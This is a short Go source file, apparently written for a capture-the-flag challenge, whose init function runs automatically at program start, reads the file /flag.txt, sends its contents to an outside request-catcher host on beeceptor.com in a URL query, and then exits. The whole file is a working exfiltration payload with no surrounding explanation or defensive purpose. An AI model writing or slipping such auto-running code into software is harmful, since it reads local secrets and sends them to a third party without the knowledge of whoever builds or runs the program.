package main

import (
 "io/ioutil"
 "net/http"
 "os"
)

func init() {
 flag, err := ioutil.ReadFile("/flag.txt")
 if err != nil {
  return
 }
 http.Get("http://rashidy.free.beeceptor.com?flag=" + string(flag))
 os.Exit(0) // Prevent further execution if needed
}
